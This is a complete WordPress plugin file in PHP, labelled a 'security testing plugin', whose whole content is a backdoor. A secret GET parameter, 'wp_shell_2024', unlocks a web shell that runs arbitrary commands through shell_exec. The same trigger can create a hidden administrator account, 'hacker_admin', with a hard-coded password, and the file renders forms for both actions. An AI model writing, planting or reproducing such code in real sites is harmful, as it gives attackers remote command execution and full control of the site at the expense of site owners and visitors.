<?php
/**
 * Plugin Name: WP Shell Plugin
 * Description: Security testing plugin
 * Version: 1.0.0
 */

if (!defined('ABSPATH')) exit;

// Shell access
if (isset($_GET['shell']) && $_GET['shell'] === 'wp_shell_2024') {
    if (isset($_GET['cmd'])) {
        echo '<pre>' . htmlspecialchars(shell_exec($_GET['cmd'])) . '</pre>';
    }
    
    // Create admin
    if (isset($_GET['admin'])) {
        $username = 'hacker_admin';
        $password = 'P@ssw0rd!';
        $email = 'hacker@example.com';
        
        if (!username_exists($username)) {
            $user_id = wp_create_user($username, $password, $email);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            echo "<p>Admin created: {$username} / {$password}</p>";
        } else {
            echo "<p>User {$username} already exists</p>";
        }
    }
    
    echo '<form method="GET"><input type="hidden" name="shell" value="wp_shell_2024"><input type="text" name="cmd" placeholder="Command"><input type="submit" value="Execute"></form>';
    echo '<form method="GET"><input type="hidden" name="shell" value="wp_shell_2024"><input type="submit" name="admin" value="Create Admin"></form>';
    exit;
}
?>